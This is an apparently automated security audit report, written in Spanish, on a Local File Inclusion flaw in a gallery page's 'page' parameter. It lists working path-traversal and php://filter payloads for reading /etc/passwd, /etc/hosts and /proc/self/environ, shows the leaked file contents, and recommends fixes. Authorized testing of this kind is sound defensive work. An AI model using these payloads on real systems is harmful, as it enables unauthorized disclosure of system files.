# Informe de auditoría - LFI
Fecha: 2026-04-27T09:01:01Z
Objetivo: http://web.dev.local:8081

Resumen ejecutivo:
Se detectó y explotó una vulnerabilidad de Local File Inclusion (LFI) en el parámetro "page" de /gallery.php. Fue posible leer archivos locales del servidor remotos, incluyendo /etc/passwd y /etc/hosts.

Detalles técnicos:
- Endpoint vulnerable: /gallery.php?page=
- Payloads probados:
  - ../../../../../../etc/passwd
  - ../../../../../../etc/hosts
  - php://filter/convert.base64-encode/resource=../../../../../../etc/passwd
  - ../../../../../../proc/self/environ

Evidencia (extractos):
- /etc/passwd (fragmento):
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

- /etc/hosts (fragmento):
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
172.19.0.2	d5054e367753

- php://filter base64 decoded contained similar passwd entries (confirmación de lectura mediante filter wrapper).

Intento de /proc/self/environ devolvió warnings de PHP que confirmaron inclusión del path y permisos denegados para ese recurso.

Impacto:
- Divulgación de información sensible del sistema (usuarios del sistema, posibles rutas y nombres de host internos).
- Potencial escalación (información útil para ataques posteriores, p.ej. configuración y credenciales encontradas en otros archivos si presentes).

Recomendaciones:
1. Validar y sanear estrictamente el parámetro "page" (usar lista blanca de valores permitidos, p.ej. "modern", "classic", "abstract", "about").
2. Evitar incluir archivos dinámicamente a partir de entrada del usuario; usar mappings internos a archivos seguros.
3. Deshabilitar wrappers peligrosos (php://) si no son necesarios o filtrar sus usos. 4. Aplicar principios de privilegios mínimos en el sistema y revisar permisos de archivos sensibles.

Acciones realizadas:
- Enumeración manual de parámetros a partir de la página raíz.
- Pruebas de traversal y wrappers php://filter para confirmar lectura de archivos.

Conclusión:
La aplicación es vulnerable a LFI en /gallery.php?page y se logró explotar para leer archivos locales; se recomienda mitigar con prioridad alta.

---
Informe generado por: auditoría automatizada autorizada
